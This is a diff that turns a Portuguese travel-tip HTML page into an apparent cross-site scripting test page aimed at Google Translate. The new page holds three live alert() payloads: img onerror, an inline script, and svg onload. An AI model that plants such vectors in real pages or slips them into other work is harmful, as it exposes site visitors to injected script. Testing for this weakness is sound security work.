@@ -1,35 +1,23 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Notícias de Viagem</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      padding: 2em;
-      background: #f0f0f0;
-    }
-    .card {
-      background: #fff;
-      padding: 1.5em;
-      border-radius: 8px;
-      box-shadow: 0 0 8px rgba(0,0,0,0.1);
-    }
-    .alert-text {
-      color: crimson;
-      font-weight: bold;
-      margin-top: 1em;
-    }
-  </style>
+  <meta charset="UTF-8" />
+  <title>Teste XSS para Google Tradutor</title>
 </head>
 <body>
-  <div class="card">
-    <h2>Dica de Viagem</h2>
-    <p>Se for à Itália, não deixe de experimentar o autêntico gelato! 🍦</p>
-    <p class="alert-text">
-      &lt;img src=x onerror="alert('Tradutor vulnerável a XSS?')"&gt;
-    </p>
-  </div>
+  <h1>Teste de XSS na tradução</h1>
+
+  <!-- Payload 1: imagem com onerror -->
+  <p>Imagem com onerror:</p>
+  <img src="x" onerror="alert('XSS - img onerror')" />
+
+  <!-- Payload 2: script direto -->
+  <p>Script direto:</p>
+  <script>alert('XSS - script')</script>
+
+  <!-- Payload 3: SVG com onload -->
+  <p>SVG com onload:</p>
+  <svg onload="alert('XSS - svg onload')"></svg>
 </body>
 </html>
 
